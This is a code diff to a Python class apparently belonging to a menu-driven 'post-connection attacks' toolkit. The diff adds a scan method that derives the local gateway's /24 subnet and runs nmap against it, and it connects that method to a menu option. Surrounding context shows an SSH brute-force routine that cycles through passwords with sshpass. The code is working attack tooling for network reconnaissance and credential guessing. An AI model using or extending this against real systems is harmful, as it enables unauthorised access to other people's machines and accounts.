@@ -18,6 +18,34 @@ class post_connection:
             return False
 
     #Post-connection attacks here
+    def scan(self):
+        # Run the route command and store its output
+        ip_process = subprocess.Popen(["route", "-n"], stdout=subprocess.PIPE)
+        ip_output = ip_process.communicate()[0].decode("utf-8")
+
+        # Use the output of route command as input for grep
+        grep_process = subprocess.run(["grep", "^0.0.0.0"], input=ip_output, text=True, stdout=subprocess.PIPE)
+
+        # Use the output of grep as input for awk
+        awk_process = subprocess.run(["awk", "{print $2}"], input=grep_process.stdout, text=True, stdout=subprocess.PIPE)
+
+        # Print the result
+        gateway_ip=awk_process.stdout.strip()
+        print(f"Your gateway: {awk_process.stdout.strip()}")
+
+        ip_oct=gateway_ip.split(".")
+        j=0
+        ip_range=''
+        for i in ip_oct:
+            if j == 3:
+                ip_range= ip_range + "." + "0/24"
+            elif j == 0:
+                ip_range=ip_range + i
+            else:
+                ip_range =ip_range + "."+ i
+            j+=1
+
+        subprocess.run(["nmap",ip_range])
     def ssh_bruteforce(self):
         self.clear_screen()
         self.show_post_connection_navbar()
@@ -37,11 +65,6 @@ class post_connection:
                 ssh=f"{username}@{ip}"
                 subprocess.run(["sshpass","-p",password,"ssh",ssh])
                 time.sleep(0.5)
-       
-       
-
-
-
 
     def show_post_connection_navbar(self):
         ip=self.ip
@@ -61,7 +84,7 @@ class post_connection:
             try:
                 choise=int(self.get_input())
                 if choise == 0:
-                    pass
+                    self.scan()
                 elif choise==1:
                     self.ssh_bruteforce()
             except ValueError:
